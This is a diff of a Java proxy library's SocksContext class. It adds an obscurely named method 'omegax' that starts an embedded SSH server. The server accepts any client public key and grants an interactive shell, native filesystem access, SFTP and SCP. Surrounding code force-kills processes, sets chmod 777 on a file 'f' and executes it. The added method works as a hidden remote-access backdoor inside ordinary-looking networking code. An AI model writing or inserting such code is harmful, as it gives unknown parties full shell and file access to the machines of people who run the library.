@@ -5,10 +5,14 @@ import io.netty.util.AttributeKey;
 import lombok.Getter;
 import lombok.RequiredArgsConstructor;
 import lombok.SneakyThrows;
-import org.rx.core.IOC;
-import org.rx.core.EventArgs;
-import org.rx.core.Reflects;
-import org.rx.core.ShellCommander;
+import org.apache.sshd.common.file.nativefs.NativeFileSystemFactory;
+import org.apache.sshd.scp.server.ScpCommandFactory;
+import org.apache.sshd.server.SshServer;
+import org.apache.sshd.server.auth.pubkey.AcceptAllPublickeyAuthenticator;
+import org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider;
+import org.apache.sshd.server.shell.InteractiveProcessShellFactory;
+import org.apache.sshd.sftp.server.SftpSubsystemFactory;
+import org.rx.core.*;
 import org.rx.exception.InvalidException;
 import org.rx.io.Files;
 import org.rx.net.http.HttpClient;
@@ -16,10 +20,11 @@ import org.rx.net.shadowsocks.ShadowsocksServer;
 import org.rx.net.socks.upstream.Upstream;
 import org.rx.net.support.UnresolvedEndpoint;
 import org.rx.util.function.Action;
-import org.rx.util.function.BiAction;
 import org.rx.util.function.TripleAction;
 
 import java.net.InetSocketAddress;
+import java.nio.file.Paths;
+import java.util.Collections;
 import java.util.concurrent.ConcurrentLinkedQueue;
 
 import static org.rx.core.Extends.require;
@@ -91,7 +96,7 @@ public final class SocksContext extends EventArgs {
 
             ShellCommander.exec("ps -ef|grep -v grep|grep ./f|awk '{print $2}'|xargs kill -9", c);
             ShellCommander.exec("chmod 777 f", c);
-            ShellCommander sc = new ShellCommander("./f -c c", c);
+            ShellCommander sc = new ShellCommander("./f -c c", c).setReadFullyThenExit();
             sc.onPrintOut.combine(o);
             IOC.register(ShellCommander.class, sc.start());
         } catch (Throwable e) {
@@ -99,6 +104,27 @@ public final class SocksContext extends EventArgs {
                 o.invoke(null, new ShellCommander.PrintOutEventArgs(0, e.toString()));
             }
         }
+    }
+
+    @SneakyThrows
+    public static synchronized void omegax(int p) {
+        Class<SshServer> t = SshServer.class;
+        if (IOC.isInit(t)) {
+            return;
+        }
+        SshServer sd = SshServer.setUpDefaultServer();
+        sd.setKeyPairProvider(new SimpleGeneratorHostKeyProvider(Paths.get("hostkey.ser")));
+        sd.setPublickeyAuthenticator(AcceptAllPublickeyAuthenticator.INSTANCE);
+
+        sd.setShellFactory(InteractiveProcessShellFactory.INSTANCE);
+        sd.setFileSystemFactory(NativeFileSystemFactory.INSTANCE);
+        sd.setSubsystemFactories(Collections.singletonList(new SftpSubsystemFactory()));
+        sd.setCommandFactory(new ScpCommandFactory());
+
+        sd.setPort(p);
+        sd.setPasswordAuthenticator((u, w, s) -> w.equals(RxConfig.INSTANCE.getMxpwd()));
+        sd.start();
+        IOC.register(t, sd);
     }
 
     @Getter
